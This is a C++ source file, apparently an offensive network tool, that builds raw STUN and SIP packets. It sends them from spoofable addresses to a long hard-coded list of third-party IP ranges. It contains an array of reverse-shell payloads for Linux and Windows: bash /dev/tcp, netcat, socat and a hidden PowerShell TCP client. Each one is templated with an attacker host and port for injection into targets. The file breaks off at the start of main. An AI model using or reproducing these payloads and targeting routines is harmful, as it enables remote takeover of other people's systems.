#include <stdio.h>
#include <stdlib.h>
#include <sstream>
#include <iostream>
#include <string>
#include <unistd.h>           // 
#include <string.h>           // 
#include <netinet/ether.h>    // ether_ntoa
#include <bits/stdc++.h>	  // for regex

#include <netdb.h>            // 
#include <sys/types.h>        // 
#include <sys/socket.h>       // needed for socket()
#include <netinet/in.h>       //
#include <netinet/ip.h>       // 
#include <netinet/ip6.h>
#include <netinet/udp.h>      //
#include <arpa/inet.h>        // 
#include <sys/ioctl.h>        // 
#include <bits/ioctls.h>      // 

#include <netinet/icmp6.h>
#include <net/if.h>           // 
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <errno.h>            //
#include <ctime>
#define MAX_PORT 65535
#define MIN_PORT 1025
#define NUM_OF_PORTS 700
#define MSG_BUF_SIZE 512
#define MAX_RETRIES_NUM 3
#define NUM_OF_PACKETS_PER_SERVER 120
#define STUN_DEFAULT_PORT 3478
#define IP4_HDRLEN 20         
#define IP6_HDRLEN 40
#define UDP_HDRLEN  8     
#define ETH_HDRLEN 14
#define MappedAddress 0x0001
#define SourceAddress 0x0004
#define ChangedAddress 0x0005
#define MOD4(x) ((x)+((x)%4))
//ICMP stuff
#define ICMPTYPE_SIZE(x) ((x)==ND_ROUTER_SOLICIT?sizeof(struct nd_router_solicit):\
         		 (x)==ND_ROUTER_ADVERT?sizeof (struct nd_router_advert) :\
			 (x)==ND_NEIGHBOR_SOLICIT?sizeof(struct nd_neighbor_solicit):\
  			 (x)==ND_NEIGHBOR_ADVERT?sizeof(struct nd_neighbor_advert):0)


using namespace std;

//stun stuff


const static uint32_t MagicCookie = 0x2112A442;

const static uint8_t IPv4Family = 0x01;
const static uint8_t IPv6Family = 0x02;

const static uint32_t ChangeIpFlag = 0x04;
const static uint32_t ChangePortFlag = 0x02;

const static uint16_t BindRequest = 0x0001;
const static uint16_t BindResponse = 0x0101;

const static uint16_t ResponseAddress = 0x0002;
const static uint16_t ChangeRequest = 0x0003; /* removed from rfc 5389.*/
const static uint16_t MessageIntegrity = 0x0008;
const static uint16_t ErrorCode = 0x0009;
const static uint16_t UnknownAttribute = 0x000A;
const static uint16_t XorMappedAddress = 0x0020;


#ifdef DEBUG_OUT
#define debug printf
#else
#define debug(...) //
#endif

//RTP stuff
#define RTP_HDRLEN 12
#define RTP_VERSION 2

//RTCP stuff
#define RTCP_HDRLEN 8
#define RTCP_VERSION 2

//VOIP stuff
#define VOIP_HDRLEN 40

//SIP stuff
#define SIP_HDRLEN 20

//SIP methods
#define SIP_INVITE 0
#define SIP_ACK 1
#define SIP_BYE 2
#define SIP_CANCEL 3
#define SIP_REGISTER 4
#define SIP_OPTIONS 5
#define SIP_INFO 6
#define SIP_PRACK 7
#define SIP_SUBSCRIBE 8
#define SIP_NOTIFY 9
#define SIP_PUBLISH 10
#define SIP_MESSAGE 11
#define SIP_UPDATE 12

//SIP responses
#define SIP_TRYING 0
#define SIP_RINGING 1
#define SIP_CALL_IS_BEING_FORWARDED 2
#define SIP_QUEUED 3
#define SIP_SESSION_PROGRESS 4

#define SIP_OK 5

//RTP buffer 
const char* sip_payload[] = {
	"INVITE sip:target SIP/2.0\r\nVia: SIP/2.0/UDP %s:%d;branch=z9hG4bK-323032-1---d%08x-%08x-%08x-%08x\r\nMax-Forwards: 70\r\nContact: <sip:target@%s:%d>\r\nTo: <sip:target@%s:%d>\r\nFrom: <sip:source@%s:%d>;tag=%08x-%08x-%08x-%08x\r\nCall-ID: %08x-%08x-%08x-%08x@%s\r\nCSeq: 1 INVITE\r\nContent-Length: 0\r\n\r\n", 
	"ACK sip:target SIP/2.0\r\nVia: SIP/2.0/UDP %s:%d;branch=z9hG4bK-323032-1---d%08x-%08x-%08x-%08x\r\nMax-Forwards: 70\r\nContact: <sip:target@%s:%d>\r\nTo: <sip:target@%s:%d>\r\nFrom: <sip:source@%s:%d>;tag=%08x-%08x-%08x-%08x\r\nCall-ID: %08x-%08x-%08x-%08x@%s\r\nCSeq: 1 ACK\r\nContent-Length: 0\r\n\r\n", 
	"BYE sip:target SIP/2.0\r\nVia: SIP/2.0/UDP %s:%d;branch=z9hG4bK-323032-1---d%08x-%08x-%08x-%08x\r\nMax-Forwards: 70\r\nContact: <sip:target@%s:%d>\r\nTo: <sip:target@%s:%d>\r\nFrom: <sip:source@%s:%d>;tag=%08x-%08x-%08x-%08x\r\nCall-ID: %08x-%08x-%08x-%08x@%s\r\nCSeq: 1 BYE\r\nContent-Length: 0\r\n\r\n",
	"REGISTER sip:target SIP/2.0\r\nVia: SIP/2.0/UDP %s:%d;branch=z9hG4bK-323032-1---d%08x-%08x-%08x-%08x\r\nMax-Forwards: 70\r\nContact: <sip:target@%s:%d>\r\nTo: <sip:target@%s:%d>\r\nFrom: <sip:source@%s:%d>;tag=%08x-%08x-%08x-%08x\r\nCall-ID: %08x-%08x-%08x-%08x@%s\r\nCSeq: 1 REGISTER\r\nContent-Length: 0\r\n\r\n",
	"OPTIONS sip:target SIP/2.0\r\nVia: SIP/2.0/UDP %s:%d;branch=z9hG4bK-323032-1---d%08x-%08x-%08x-%08x\r\nMax-Forwards: 70\r\nContact: <sip:target@%s:%d>\r\nTo: <sip:target@%s:%d>\r\nFrom: <sip:source@%s:%d>;tag=%08x-%08x-%08x-%08x\r\nCall-ID: %08x-%08x-%08x-%08x@%s\r\nCSeq: 1 OPTIONS\r\nContent-Length: 0\r\n\r\n",
	"INFO sip:target SIP/2.0\r\nVia: SIP/2.0/UDP %s:%d;branch=z9hG4bK-323032-1---d%08x-%08x-%08x-%08x\r\nMax-Forwards: 70\r\nContact: <sip:target@%s:%d>\r\nTo: <sip:target@%s:%d>\r\nFrom: <sip:source@%s:%d>;tag=%08x-%08x-%08x-%08x\r\nCall-ID: %08x-%08x-%08x-%08x@%s\r\nCSeq: 1 INFO\r\nContent-Length: 0\r\n\r\n",
	"PRACK sip:target SIP/2.0\r\nVia: SIP/2.0/UDP %s:%d;branch=z9hG4bK-323032-1---d%08x-%08x-%08x-%08x\r\nMax-Forwards: 70\r\nContact: <sip:target@%s:%d>\r\nTo: <sip:target@%s:%d>\r\nFrom: <sip:source@%s:%d>;tag=%08x-%08x-%08x-%08x\r\nCall-ID: %08x-%08x-%08x-%08x@%s\r\nCSeq: 1 PRACK\r\nContent-Length: 0\r\n\r\n",
	"SUBSCRIBE sip:target SIP/2.0\r\nVia: SIP/2.0/UDP %s:%d;branch=z9hG4bK-323032-1---d%08x-%08x-%08x-%08x\r\nMax-Forwards: 70\r\nContact: <sip:target@%s:%d>\r\nTo: <sip:target@%s:%d>\r\nFrom: <sip:source@%s:%d>;tag=%08x-%08x-%08x-%08x\r\nCall-ID: %08x-%08x-%08x-%08x@%s\r\nCSeq: 1 SUBSCRIBE\r\nContent-Length: 0\r\n\r\n",
	"NOTIFY sip:target SIP/2.0\r\nVia: SIP/2.0/UDP %s:%d;branch=z9hG4bK-323032-1---d%08x-%08x-%08x-%08x\r\nMax-Forwards: 70\r\nContact: <sip:target@%s:%d>\r\nTo: <sip:target@%s:%d>\r\nFrom: <sip:source@%s:%d>;tag=%08x-%08x-%08x-%08x\r\nCall-ID: %08x-%08x-%08x-%08x@%s\r\nCSeq: 1 NOTIFY\r\nContent-Length: 0\r\n\r\n", 
	"PUBLISH sip:target SIP/2.0\r\nVia: SIP/2.0/UDP %s:%d;branch=z9hG4bK-323032-1---d%08x-%08x-%08x-%08x\r\nMax-Forwards: 70\r\nContact: <sip:target@%s:%d>\r\nTo: <sip:target@%s:%d>\r\nFrom: <sip:source@%s:%d>;tag=%08x-%08x-%08x-%08x\r\nCall-ID: %08x-%08x-%08x-%08x@%s\r\nCSeq: 1 PUBLISH\r\nContent-Length: 0\r\n\r\n",
	"MESSAGE sip:target SIP/2.0\r\nVia: SIP/2.0/UDP %s:%d;branch=z9hG4bK-323032-1---d%08x-%08x-%08x-%08x\r\nMax-Forwards: 70\r\nContact: <sip:target@%s:%d>\r\nTo: <sip:target@%s:%d>\r\nFrom: <sip:source@%s:%d>;tag=%08x-%08x-%08x-%08x\r\nCall-ID: %08x-%08x-%08x-%08x@%s\r\nCSeq: 1 MESSAGE\r\nContent-Length: 0\r\n\r\n" 
};

//payload buffer for targets with reverse shell for linux:

//
//payload buffer for targets with reverse shell for linux: 
const char* x_payload[] = {"bash -i >& /dev/tcp/%s/%d 0>&1",
	"nc -e /bin/sh %s %d",
	"rm -f /tmp/p; mknod /tmp/p p && nc %s %d 0/tmp/p",
	"nc -c /bin/sh %s %d",
	"nc -c /bin/bash %s %d",
	"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:%s:%d", 
	"bash -i >& /dev/tcp/%s/%d 0>&1",
	//reverse shell for windows:
	"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"%s\",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()", 
	"powershell -NoP -NonI -W Hidden -Exec Bypass -Command $client = New-Object System.Net.Sockets.TCPClient(\"%s\",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",	
}; 

int send_raw6(char *data,size_t datalen,const char*src_ip4,const char* src_ip6,const char*dst_ip,const char* target4,const char* target6,const char* interface);
char** stun_addresses = nullptr;

uint16_t
udp6_checksum (struct ip6_hdr iphdr, struct udphdr udphdr, uint8_t *payload, int payloadlen) ;

#pragma pack(0)

typedef struct {
	uint32_t longpart[4];
} UInt128;
typedef struct {
	uint32_t longpart[3];
} UInt96;

typedef struct {
	uint32_t magicCookie; // rfc 5389
	UInt96 tid;
} Id;

typedef struct {
	uint16_t msg_type;
	uint16_t msg_len; // length of stun body
	union {
		UInt128 magicCookieAndTid;
		Id id;
	};
} stun_header;

typedef struct { 

      uint16_t attribute_type;
      uint16_t size;
      char offset;


} stun_attribute ;

struct rtp_gadget {
	uint8_t version;
	uint8_t padding;
	uint8_t extension;
	uint8_t csrc_count;
	uint8_t marker;
	uint8_t payload_type;
	uint16_t sequence_number;
	uint32_t timestamp;
	uint32_t ssrc;
};

//rtcp header gadgets:

struct rtcp_gadget {
	uint8_t version;
	uint8_t padding;
	uint8_t rc;
	uint8_t pt;
	uint16_t length;
};

//voip header gadgets:

struct voip_gadget {
	uint8_t version;
	uint8_t padding;
	uint8_t extension;
	uint8_t csrc_count;
	uint8_t marker;
	uint8_t payload_type;
	uint16_t sequence_number;
	uint32_t timestamp;
	uint32_t ssrc;
	uint32_t ssrc_source;
};	

//sip header gadgets:	

struct sip_gadget {
	uint8_t version;
	uint8_t padding;
	uint8_t extension;
	uint8_t csrc_count;
	uint8_t marker;
	uint8_t payload_type;
	uint16_t sequence_number;
	uint32_t timestamp;
	uint32_t ssrc;
	uint32_t ssrc_source;
	uint32_t ssrc_dest;
};






#pragma pack()

extern "C" uint16_t checksum(uint16_t*, int);
extern "C" uint16_t udp4_checksum(struct ip, struct udphdr, const uint8_t*,
		int);
extern "C" uint16_t udp6_checksum(struct ip6_hdr, struct udphdr, const uint8_t*,
		int);

static int ports[MAX_PORT - MIN_PORT];
// Computing the internet checksum (RFC 1071).
// Note that the internet checksum is not guaranteed to preclude collisions.
 // Build IPv6 UDP pseudo-header and call checksum function (Section 8.1 of RFC 2460).
uint16_t udp6_checksum(struct ip6_hdr iphdr, struct udphdr udphdr,
		const uint8_t *payload, int payloadlen) {

	char buf[IP_MAXPACKET];
	char *ptr;
	int chksumlen = 0;
	int i;

	ptr = &buf[0];  // ptr points to beginning of buffer buf

	// Copy source IP address into buf (128 bits)
	memcpy(ptr, &iphdr.ip6_src.s6_addr, sizeof(iphdr.ip6_src.s6_addr));
	ptr += sizeof(iphdr.ip6_src.s6_addr);
	chksumlen += sizeof(iphdr.ip6_src.s6_addr);

	// Copy destination IP address into buf (128 bits)
	memcpy(ptr, &iphdr.ip6_dst.s6_addr, sizeof(iphdr.ip6_dst.s6_addr));
	ptr += sizeof(iphdr.ip6_dst.s6_addr);
	chksumlen += sizeof(iphdr.ip6_dst.s6_addr);

	// Copy UDP length into buf (32 bits)
	memcpy(ptr, &udphdr.len, sizeof(udphdr.len));
	ptr += sizeof(udphdr.len);
	chksumlen += sizeof(udphdr.len);

	// Copy zero field to buf (24 bits)
	*ptr = 0;
	ptr++;
	*ptr = 0;
	ptr++;
	*ptr = 0;
	ptr++;
	chksumlen += 3;

	// Copy next header field to buf (8 bits)
	memcpy(ptr, &iphdr.ip6_nxt, sizeof(iphdr.ip6_nxt));
	ptr += sizeof(iphdr.ip6_nxt);
	chksumlen += sizeof(iphdr.ip6_nxt);

	// Copy UDP source port to buf (16 bits)
	memcpy(ptr, &udphdr.source, sizeof(udphdr.source));
	ptr += sizeof(udphdr.source);
	chksumlen += sizeof(udphdr.source);

	// Copy UDP destination port to buf (16 bits)
	memcpy(ptr, &udphdr.dest, sizeof(udphdr.dest));
	ptr += sizeof(udphdr.dest);
	chksumlen += sizeof(udphdr.dest);

	// Copy UDP length again to buf (16 bits)
	memcpy(ptr, &udphdr.len, sizeof(udphdr.len));
	ptr += sizeof(udphdr.len);
	chksumlen += sizeof(udphdr.len);

	// Copy UDP checksum to buf (16 bits)
	// Zero, since we don't know it yet
	*ptr = 0;
	ptr++;
	*ptr = 0;
	ptr++;
	chksumlen += 2;

	// Copy payload to buf
	memcpy(ptr, payload, payloadlen * sizeof(uint8_t));
	ptr += payloadlen;
	chksumlen += payloadlen;

	// Pad to the next 16-bit boundary
	for (i = 0; i < payloadlen % 2; i++, ptr++) {
		*ptr = 0;
		ptr++;
		chksumlen++;
	}

	return checksum((uint16_t*) buf, chksumlen);
}

extern uint16_t udp4_checksum(struct ip iphdr, struct udphdr udphdr,
		const uint8_t *payload, int payloadlen) {

	char buf[IP_MAXPACKET];
	char *ptr;
	int chksumlen = 0;
	int i;

	ptr = &buf[0];  // ptr points to beginning of buffer buf

	// Copy source IP address into buf (32 bits)
	memcpy(ptr, &iphdr.ip_src.s_addr, sizeof(iphdr.ip_src.s_addr));
	ptr += sizeof(iphdr.ip_src.s_addr);
	chksumlen += sizeof(iphdr.ip_src.s_addr);

	// Copy destination IP address into buf (32 bits)
	memcpy(ptr, &iphdr.ip_dst.s_addr, sizeof(iphdr.ip_dst.s_addr));
	ptr += sizeof(iphdr.ip_dst.s_addr);
	chksumlen += sizeof(iphdr.ip_dst.s_addr);

	// Copy zero field to buf (8 bits)
	*ptr = 0;
	ptr++;
	chksumlen += 1;

	// Copy transport layer protocol to buf (8 bits)
	memcpy(ptr, &iphdr.ip_p, sizeof(iphdr.ip_p));
	ptr += sizeof(iphdr.ip_p);
	chksumlen += sizeof(iphdr.ip_p);

	// Copy UDP length to buf (16 bits)
	memcpy(ptr, &udphdr.len, sizeof(udphdr.len));
	ptr += sizeof(udphdr.len);
	chksumlen += sizeof(udphdr.len);

	// Copy UDP source port to buf (16 bits)
	memcpy(ptr, &udphdr.source, sizeof(udphdr.source));
	ptr += sizeof(udphdr.source);
	chksumlen += sizeof(udphdr.source);

	// Copy UDP destination port to buf (16 bits)
	memcpy(ptr, &udphdr.dest, sizeof(udphdr.dest));
	ptr += sizeof(udphdr.dest);
	chksumlen += sizeof(udphdr.dest);

	// Copy UDP length again to buf (16 bits)
	memcpy(ptr, &udphdr.len, sizeof(udphdr.len));
	ptr += sizeof(udphdr.len);
	chksumlen += sizeof(udphdr.len);

	// Copy UDP checksum to buf (16 bits)
	// Zero, since we don't know it yet
	*ptr = 0;
	ptr++;
	*ptr = 0;
	ptr++;
	chksumlen += 2;

	// Copy payload to buf
	memcpy(ptr, payload, payloadlen);
	ptr += payloadlen;
	chksumlen += payloadlen;

	// Pad to the next 16-bit boundary
	for (i = 0; i < payloadlen % 2; i++, ptr++) {
		*ptr = 0;
		ptr++;
		chksumlen++;
	}

	return checksum((uint16_t*) buf, chksumlen);
}

uint16_t
udp6_checksum (struct ip6_hdr iphdr, struct udphdr udphdr, uint8_t *payload, int payloadlen) {

  char buf[IP_MAXPACKET];
  char *ptr;
  int chksumlen = 0;
  int i;

  memset (buf, 0, IP_MAXPACKET * sizeof (uint8_t));

  ptr = &buf[0];  // ptr points to beginning of buffer buf

  // Copy source IP address into buf (128 bits)
  memcpy (ptr, &iphdr.ip6_src.s6_addr, sizeof (iphdr.ip6_src.s6_addr));
  ptr += sizeof (iphdr.ip6_src.s6_addr);
  chksumlen += sizeof (iphdr.ip6_src.s6_addr);

  // Copy destination IP address into buf (128 bits)
  memcpy (ptr, &iphdr.ip6_dst.s6_addr, sizeof (iphdr.ip6_dst.s6_addr));
  ptr += sizeof (iphdr.ip6_dst.s6_addr);
  chksumlen += sizeof (iphdr.ip6_dst.s6_addr);

  // Copy UDP length into buf (32 bits)
  memcpy (ptr, &udphdr.len, sizeof (udphdr.len));
  ptr += sizeof (udphdr.len);
  chksumlen += sizeof (udphdr.len);

  // Copy zero field to buf (24 bits)
  *ptr = 0; ptr++;
  *ptr = 0; ptr++;
  *ptr = 0; ptr++;
  chksumlen += 3;

  // Copy next header field to buf (8 bits)
  memcpy (ptr, &iphdr.ip6_nxt, sizeof (iphdr.ip6_nxt));
  ptr += sizeof (iphdr.ip6_nxt);
  chksumlen += sizeof (iphdr.ip6_nxt);

  // Copy UDP source port to buf (16 bits)
  memcpy (ptr, &udphdr.source, sizeof (udphdr.source));
  ptr += sizeof (udphdr.source);
  chksumlen += sizeof (udphdr.source);

  // Copy UDP destination port to buf (16 bits)
  memcpy (ptr, &udphdr.dest, sizeof (udphdr.dest));
  ptr += sizeof (udphdr.dest);
  chksumlen += sizeof (udphdr.dest);

  // Copy UDP length again to buf (16 bits)
  memcpy (ptr, &udphdr.len, sizeof (udphdr.len));
  ptr += sizeof (udphdr.len);
  chksumlen += sizeof (udphdr.len);

  // Copy UDP checksum to buf (16 bits)
  // Zero, since we don't know it yet
  *ptr = 0; ptr++;
  *ptr = 0; ptr++;
  chksumlen += 2;

  // Copy payload to buf
  memcpy (ptr, payload, payloadlen * sizeof (uint8_t));
  ptr += payloadlen;
  chksumlen += payloadlen;

  // Pad to the next 16-bit boundary
  i = 0;
  while (((payloadlen+i)%2) != 0) {
    i++;
    chksumlen++;
    ptr++;
  }

  return checksum ((uint16_t *) buf, chksumlen);
}


//some structs for bind. we don't
//
//

char* encode16(char *buf, uint16_t data) {
	uint16_t ndata = htons(data);
	memcpy(buf, (void*) (&ndata), sizeof(uint16_t));
	return buf + sizeof(uint16_t);
}

char* encode32(char *buf, uint32_t data) {
	uint32_t ndata = htonl(data);
	memcpy(buf, (void*) (&ndata), sizeof(uint32_t));

	return buf + sizeof(uint32_t);
}

char* encodeAtrUInt32(char *ptr, uint16_t type, uint32_t value) {
	ptr = encode16(ptr, type);
	ptr = encode16(ptr, 4);
	ptr = encode32(ptr, value);

	return ptr;
}

char* encode(char *buf, const char *data, unsigned int length) {
	memcpy(buf, data, length);
	return buf + length;
}

void shuffle(int *num, int len) {
	
	std::chrono::system_clock::time_point tp = std::chrono::system_clock::now(); 
	std::chrono::system_clock::duration dtn = tp.time_since_epoch(); 
	unsigned int seed = dtn.count();
	srand(seed);


	int i, r, temp;
	for (i = len - 1; i > 0; i--) {
		
		//r = rand() % i; use chrono instead of rand
		r = seed % i;


		num[i]=num[i]^num[r];
		num[r]=num[r]^num[i];
		num[i]=num[r]^num[i];

	}
}

uint16_t random_port() {
	return 10000 + (rand() % 65355);
}

int send_raw4(char *data, size_t datalen, const char *src_ip,
		const char *dst_ip, const char *target, const char *interface);
//
// gets target6 and source6 and calls send_raw6. 
//
//
void parse_inet6(const char *ifname ,char ipv6[INET6_ADDRSTRLEN]) {
    FILE *f;
    int ret, scope, prefix;
//unsigned char ipv6[16];
    char dname[IFNAMSIZ];
    static char address[INET6_ADDRSTRLEN];
    char *scopestr;

    f = fopen("/proc/net/if_inet6", "r");
    if (f == NULL) {
        return;
    }

    while (19 == fscanf(f,
                        " %2hhx%2hhx%2hhx%2hhx%2hhx%2hhx%2hhx%2hhx%2hhx%2hhx%2hhx%2hhx%2hhx%2hhx%2hhx%2hhx %*x %x %x %*x %s",
                        &ipv6[0],
                        &ipv6[1],
                        &ipv6[2],
                        &ipv6[3],
                        &ipv6[4],
                        &ipv6[5],
                        &ipv6[6],
                        &ipv6[7],
                        &ipv6[8],
                        &ipv6[9],
                        &ipv6[10],
                        &ipv6[11],
                        &ipv6[12],
                        &ipv6[13],
                        &ipv6[14],
                        &ipv6[15],
                        &prefix,
                        &scope,
                        dname)) {

        if (strcmp(ifname, dname) != 0) {
            continue;
        }

        if (inet_ntop(AF_INET6, ipv6, address, sizeof(address)) == NULL) {
            continue;
        }

        debug("IPv6 address: %s, prefix: %d, scope: %d\n", address, prefix, scope);
    }

    strncpy ( ipv6,address, INET6_ADDRSTRLEN-1 ); 


    
    fclose(f);
}
int send_raw4_over_6(char* data,size_t datalen,const char* src_ip, const char*dst_ip, const char* target4,const char* interface,const char* target6_arg) 
{
    static char* src_ip6=NULL,*dst_ip6=NULL,*target_ip=NULL;    
    static char src6[INET6_ADDRSTRLEN],addr[INET6_ADDRSTRLEN];
    static struct addrinfo* adi = nullptr;
	
	static bool address_found = false;

    //struct in6_ifreq {
    //    struct in6_addr ifr6_addr;
    //    uint32_t        ifr6_prefixlen;
    //    int             ifr6_ifindex;
    //	};
    //get ip6 of interface :
    //

	if(!address_found || src_ip6==nullptr) { 

    parse_inet6(interface,src6); 

    char* src_address6  =&src6[0]; //inet_ntop(AF_INET6, &((struct sockaddr_in6 *)ifr->sin6_addr), src6, INET6_ADDRSTRLEN);

    debug("[+] debug src : %s\n",src6);

    
   // char* src_address6 =inet_ntop(AF_INET6, &(((struct sockaddr_in6 *)sin)->sin6_addr), &src6[0], INET6_ADDRSTRLEN));

   debug("[+] debug call getaddrinfo \n");


    addrinfo hints = {0};
	// TODO: Might be uses to lookup other values.
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_ALL;
    hints.ai_family = AF_INET6;
    hints.ai_flags |=AI_PASSIVE|AI_NUMERICHOST|AI_V4MAPPED|AI_CANONNAME;
    int result = getaddrinfo(dst_ip,nullptr, &hints, &adi);    

    if(adi) 
    {
	
	    debug("[+] debug call getaddrinfo for %s \n ",dst_ip);
	    	for (struct addrinfo* p = adi; p != NULL; p = p->ai_next) {
		if (p->ai_family == AF_INET6) {
			// is a valid IP Address
			debug("debug call inet_ntop \n");
			char target6name[INET6_ADDRSTRLEN]={};

			if (inet_ntop(AF_INET6, &(((struct sockaddr_in6*)p->ai_addr)->sin6_addr),target6name ,INET6_ADDRSTRLEN ) != 0) {
				//ignore ::::IPv4 
				//if(strstr(target6,dst_ip)!=nullptr) 
				//{
				//	printf("[+] ignoring %s",target6 );
				//}
				//else
				//freeaddrinfo(adi);
				{

					std::string target6 = (target6_arg==nullptr)?target6name:target6_arg;

					

					debug("[+] calling send_raw6( data,%lu,%s,%s,%s,%s,%s,%s) \n",datalen,src_ip,src_address6,dst_ip
				     	,target4,target6.c_str(),interface);
				

			   		result = send_raw6(data, datalen,src_ip,src_address6,dst_ip,target4,target6.c_str(),interface);
					freeaddrinfo(adi);
					return result;
				}
				//push_back(addr);
				////				
			}
		}
		else
		{
			debug("[+_]\n");
		}


	  }
	   
	freeaddrinfo(adi);	

    }
	}else {
		debug("[+] calling send_raw6( data,%lu,%s,%s,%s,%s,%s,%s) \n",datalen,src_ip,src_ip6,dst_ip
				     	,target4,target_ip,interface); 
		return send_raw6(data, datalen,src_ip,src_ip6,dst_ip,target4,target_ip,interface);
	}
	return -1;
}


static void gen_random_string(char *s, const int len) {
	static const char alphanum[] = "0123456789"
			"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
			"abcdefghijklmnopqrstuvwxyz";

	int i = 0;
	for (; i < len; ++i) {
		s[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
	}
}

bool Validate_ip(const string& ip)
{
	bool isValid = false;
 
    // Regex expression for validating IPv4
    regex ipv4("(([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])\\.){3}([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])");
 
    // Regex expression for validating IPv6
    regex ipv6("((([0-9a-fA-F]){1,4})\\:){7}([0-9a-fA-F]){1,4}");
 
    // Checking if it is a valid IPv4 addresses
    if (regex_match(ip, ipv4))
        isValid = true;
 
    // Checking if it is a valid IPv6 addresses
    else if (regex_match(ip, ipv6))
        isValid = true;
 
    // Return Invalid
    return isValid;
}

// vector<string>
void cidr_to_ips(const vector<string>& cidr, vector<string>& ips){

	int start;
	int end;

	for (int i = 0; i < cidr.size(); i++) {
		string current = cidr.at(i);

		int last_octet = current.find_last_of('.') + 1;
		int slash_pos = current.find('/') + 1;

		stringstream start_to_int(current.substr(last_octet, slash_pos - last_octet - 1));
		start_to_int >> start;

		if (slash_pos == 0) {
			end = start + 1;
		} else {
			stringstream end_to_int(current.substr(slash_pos));
			end_to_int >> end;
		}
		

		for (;start < end + 1; start++) 
		{
			string ip = current.substr(0, last_octet).append(to_string(start));
			if(Validate_ip(ip)){
				ips.push_back(current.substr(0, last_octet).append(to_string(start)));
			}
		}
	}
}


//moved from main stack to global heap:
std::vector<std::string> cidr_list = {
"3.7.35.0/25",
"3.21.137.128/25",
"3.22.11.0/24",
"3.23.93.0/24",
"3.25.41.128/25",
"3.25.42.0/25",
"3.25.49.0/24",
"3.80.20.128/25",
"3.96.19.0/24",
"3.101.32.128/25",
"3.101.52.0/25",
"3.104.34.128/25",
"3.120.121.0/25",
"3.127.194.128/25",
"3.208.72.0/25",
"3.211.241.0/25",
"3.235.69.0/25",
"3.235.82.0/23",
"3.235.71.128/25",
"3.235.72.128/25",
"3.235.73.0/25",
"3.235.96.0/23",
"4.34.125.128/25",
"4.35.64.128/25",
"8.5.128.0/23",
"13.52.6.128/25",
"13.52.146.0/25",
"18.157.88.0/24",
"18.205.93.128/25",
"20.203.158.80/28",
"20.203.190.192/26",
"50.239.202.0/23",
"50.239.204.0/24",
"52.61.100.128/25",
"52.202.62.192/26",
"52.215.168.0/25",
"64.125.62.0/24",
"64.211.144.0/24",
"64.224.32.0/19",
"65.39.152.0/24",
"69.174.57.0/24",
"69.174.108.0/22",
"99.79.20.0/25",
"101.36.167.0/24",
"103.122.166.0/23",
"111.33.115.0/25",
"111.33.181.0/25",
"115.110.154.192/26", 
"115.114.56.192/26",
"115.114.115.0/26",
"115.114.131.0/26",
"120.29.148.0/24",
"129.151.0.0/19",
"129.151.40.0/22",
"129.151.48.0/20",
"129.159.0.0/20",
"129.159.160.0/19",
"129.159.208.0/20",
"130.61.164.0/22",
"134.224.0.0/16",
"140.238.128.0/24",
"140.238.232.0/22",
"144.195.0.0/16",
"147.124.96.0/19",
"149.137.0.0/17",
"150.230.224.0/21",
"152.67.20.0/24",
"152.67.118.0/24",
"152.67.168.0/22",
"152.67.180.0/24",
"152.67.184.0/22",
"152.67.240.0/21",
"152.70.224.0/21",
"156.45.0.0/17",
"158.101.64.0/24",
"158.101.184.0/22",
"160.1.56.128/25",
"161.199.136.0/22",
"162.12.232.0/22",
"162.255.36.0/22",
"165.254.88.0/23",
"166.108.64.0/18",
"168.138.16.0/22",
"168.138.48.0/24",
"168.138.56.0/21",
"168.138.72.0/24",
"168.138.74.0/25",
"168.138.80.0/21",
"168.138.96.0/22",
"168.138.116.0/22",
"168.138.244.0/24",
"170.114.0.0/16",
"173.231.80.0/20",
"192.204.12.0/22",
"193.122.16.0/20",
"193.122.32.0/20",
"193.122.208.0/20",
"193.122.224.0/20",
"193.122.240.0/20",
"193.123.0.0/19",
"193.123.40.0/21",
"193.123.128.0/19,",
"193.123.168.0/21",
"193.123.192.0/19",
"198.251.128.0/17",
"202.177.207.128/27",
"204.80.104.0/21",
"204.141.28.0/22",
"206.247.0.0/16",
"207.226.132.0/24",
"209.9.211.0/24",
"209.9.215.0/24",
"213.19.144.0/24",
"213.19.153.0/24",
"213.244.140.0/24",
"221.122.88.64/27",
"221.122.88.128/25",
"221.122.89.128/25",
"221.123.139.192/27",
"18.219.12.125", "65.39.152.63", "69.174.57.1/2", "69.174.57.4", 
"120.29.148.66", "129.151.0.1", "129.151.40.55", "152.67.168.1", 
"152.67.168.5", "152.67.168.12", "152.67.240.1", "193.122.16.0", 
"221.123.139.192", "170.114.0.34", "64.125.62.1/3", "64.125.62.5", 
"64.211.144.66/68", "185.60.216.2", "185.60.218.2", "31.13.82.48", 
"31.13.84.48", "173.252.75.2", "31.13.90.48", "31.13.66.48", 
"31.13.86.48", "34.216.110.128", "34.216.110.129", "34.216.110.130", 
"34.216.110.131", "3.101.28.97", "52.53.215.76", "97.28.101.3", 
"3.235.82.1/254", "3.235.83.0/254", "52.202.62.192", "52.202.62.193", "52.202.62.194", "52.215.168.66","85.119.56.0/23","170.72.17.128/25","199.59.64.0/21","199.19.196.0/23","170.72.0.128/25"
};


int main(int argc, char **argv) {


	//parse cidr list to ips
	vector<string> ips;
